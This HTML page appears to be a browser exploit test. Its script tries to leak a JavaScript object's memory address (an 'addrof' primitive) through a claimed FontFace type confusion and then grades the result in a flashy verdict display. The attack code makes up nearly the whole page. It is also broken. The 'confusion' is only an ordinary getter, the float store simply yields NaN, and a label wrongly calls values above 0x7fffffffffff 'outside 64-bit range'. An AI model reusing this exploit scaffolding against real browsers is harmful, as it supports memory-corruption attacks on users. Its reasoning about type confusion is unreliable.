<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verify Leak - Show Real Data</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 15px; line-height: 1.7; }
        h1 { color: #f00; font-size: 26px; margin-bottom: 20px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
        .btn { padding: 18px 35px; background: #f00; border: none; color: #fff; margin: 10px auto; cursor: pointer; font-size: 18px; font-weight: bold; display: block; width: 450px; }
        .section { background: #1a0000; border: 3px solid #f00; margin: 20px 0; padding: 25px; }
        .title { color: #ff0; font-size: 20px; font-weight: bold; margin-bottom: 20px; border-bottom: 2px solid #ff0; padding-bottom: 10px; }
        .result { background: #000; border: 3px solid #0ff; padding: 20px; margin: 15px 0; font-size: 18px; }
        .label { color: #0ff; font-weight: bold; display: inline-block; width: 250px; }
        .value { color: #fff; font-weight: bold; font-size: 20px; }
        .pass { color: #0f0; font-weight: bold; font-size: 18px; }
        .fail { color: #f00; font-weight: bold; font-size: 18px; }
    </style>
</head>
<body>
    <h1>🔍 VERIFICATION: Show Real Leaked Data 🔍</h1>
    
    <div style="text-align: center; margin-bottom: 20px;">
        <button class="btn" onclick="showRealLeak()">▶ SHOW LEAKED ADDRESS (RAW)</button>
    </div>
    
    <div class="section">
        <div class="title">📊 RAW LEAK DATA - NO INTERPRETATION</div>
        <div id="output"></div>
    </div>

<script>
var convBuf = new ArrayBuffer(8);
var f64 = new Float64Array(convBuf);
var u32 = new Uint32Array(convBuf);

function f2i(f) {
    f64[0] = f;
    return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
}

function hex(val) {
    if (typeof val === 'bigint') {
        var s = val.toString(16);
        while (s.length < 16) s = '0' + s;
        return '0x' + s;
    }
    return '0x' + val.toString(16);
}

function out(html) {
    document.getElementById('output').innerHTML += html;
}

function showRealLeak() {
    document.getElementById('output').innerHTML = '';
    
    out('<div class="result">');
    out('<div><span class="label">TEST:</span> <span class="value">Attempting to leak object address</span></div>');
    out('</div>');
    
    // Create test object
    var testObj = { marker: 0xdeadbeef, id: 123 };
    
    out('<div class="result">');
    out('<div><span class="label">Test object created:</span> <span class="value">' + JSON.stringify(testObj) + '</span></div>');
    out('</div>');
    
    // Setup confusion
    var ff = new FontFace("leak", "");
    
    Object.defineProperty(ff, 'family', {
        get: function() { return testObj; },
        configurable: true
    });
    
    out('<div class="result">');
    out('<div><span class="label">FontFace confusion:</span> <span class="value">INSTALLED</span></div>');
    out('</div>');
    
    // Get confused value
    var leaked = ff.family;
    
    out('<div class="result">');
    out('<div><span class="label">Retrieved type:</span> <span class="value">' + typeof leaked + '</span></div>');
    out('<div><span class="label">Retrieved value:</span> <span class="value">' + leaked + '</span></div>');
    out('</div>');
    
    // Try to store in float array
    var floats = new Float64Array(5);
    floats[0] = 1.1;
    floats[1] = 2.2;
    
    out('<div class="result">');
    out('<div><span class="label">Float array created:</span> <span class="value">5 elements</span></div>');
    out('<div><span class="label">floats[0]:</span> <span class="value">' + floats[0] + '</span></div>');
    out('<div><span class="label">floats[1]:</span> <span class="value">' + floats[1] + '</span></div>');
    out('</div>');
    
    var storeSuccess = false;
    var leakedAddr = null;
    
    try {
        floats[2] = leaked;
        storeSuccess = true;
    } catch(e) {
        out('<div class="result">');
        out('<div><span class="fail">❌ STORE FAILED: ' + e.message + '</span></div>');
        out('</div>');
    }
    
    if (storeSuccess) {
        var readback = floats[2];
        
        out('<div class="result">');
        out('<div><span class="label">Store to floats[2]:</span> <span class="pass">✓ SUCCESS</span></div>');
        out('<div><span class="label">Readback type:</span> <span class="value">' + typeof readback + '</span></div>');
        out('<div><span class="label">Readback value:</span> <span class="value">' + readback + '</span></div>');
        out('</div>');
        
        if (typeof readback === 'number') {
            var bits = f2i(readback);
            leakedAddr = bits;
            
            out('<div class="result" style="border-color: #f0f; border-width: 5px;">');
            out('<div style="font-size: 24px; color: #f0f; margin-bottom: 15px;">⚠️ LEAKED RAW BITS ⚠️</div>');
            out('<div><span class="label">RAW HEX VALUE:</span></div>');
            out('<div style="font-size: 28px; color: #fff; margin: 15px 0; font-family: Courier New;">' + hex(bits) + '</div>');
            out('<div><span class="label">DECIMAL VALUE:</span> <span class="value">' + bits + '</span></div>');
            out('</div>');
            
            // Analyze the value
            out('<div class="result">');
            out('<div style="font-size: 20px; color: #ff0; margin-bottom: 10px;">ANALYSIS:</div>');
            
            if (bits === 0n) {
                out('<div><span class="fail">❌ VALUE IS ZERO - Not a real address</span></div>');
            } else if (bits < 0x10000n) {
                out('<div><span class="fail">❌ VALUE TOO SMALL (' + hex(bits) + ') - Not a valid pointer</span></div>');
            } else if (bits > 0x7fffffffffffn) {
                out('<div><span class="fail">❌ VALUE TOO LARGE - Outside 64-bit range</span></div>');
            } else {
                out('<div><span class="pass">✓ VALUE IN VALID POINTER RANGE!</span></div>');
                out('<div><span class="label">Alignment:</span> <span class="value">' + ((bits & 0xfn) === 0n ? '16-byte (GOOD)' : 'Non-aligned') + '</span></div>');
                out('<div><span class="label">Lower 16 bits:</span> <span class="value">' + hex(Number(bits & 0xffffn)) + '</span></div>');
                out('<div><span class="label">Upper 48 bits:</span> <span class="value">' + hex(bits >> 16n) + '</span></div>');
            }
            out('</div>');
            
        } else {
            out('<div class="result">');
            out('<div><span class="fail">❌ READBACK NOT A NUMBER - Type confusion failed</span></div>');
            out('</div>');
        }
    }
    
    // FINAL VERDICT
    out('<div class="result" style="border-color: ' + (leakedAddr !== null && leakedAddr !== 0n && leakedAddr > 0x10000n ? '#0f0' : '#f00') + '; border-width: 5px; margin-top: 30px;">');
    out('<div style="font-size: 26px; font-weight: bold; margin-bottom: 15px;">FINAL VERDICT:</div>');
    
    if (leakedAddr !== null && leakedAddr !== 0n && leakedAddr > 0x10000n && leakedAddr < 0x7fffffffffffn) {
        out('<div style="font-size: 22px; color: #0f0;">✅ REAL ADDRESS LEAKED!</div>');
        out('<div style="margin-top: 10px;">addrof() primitive is WORKING</div>');
        out('<div>Leaked address: ' + hex(leakedAddr) + '</div>');
    } else if (leakedAddr === 0n) {
        out('<div style="font-size: 22px; color: #f00;">❌ LEAKED VALUE IS ZERO</div>');
        out('<div style="margin-top: 10px;">This is NOT a real address leak</div>');
        out('<div>Type confusion may be blocked</div>');
    } else if (leakedAddr !== null) {
        out('<div style="font-size: 22px; color: #ff0;">⚠️ LEAKED INVALID VALUE</div>');
        out('<div style="margin-top: 10px;">Value: ' + hex(leakedAddr) + '</div>');
        out('<div>Not in valid pointer range</div>');
    } else {
        out('<div style="font-size: 22px; color: #f00;">❌ NO LEAK OCCURRED</div>');
        out('<div style="margin-top: 10px;">Type confusion is completely blocked</div>');
    }
    
    out('</div>');
}

window.onerror = function(msg, url, line) {
    out('<div class="result" style="border-color: #f00;">');
    out('<div style="color: #f00; font-size: 20px;">💥 ERROR: ' + msg + '</div>');
    out('<div>Line: ' + line + '</div>');
    out('</div>');
    return true;
};
</script>
</body>
</html>
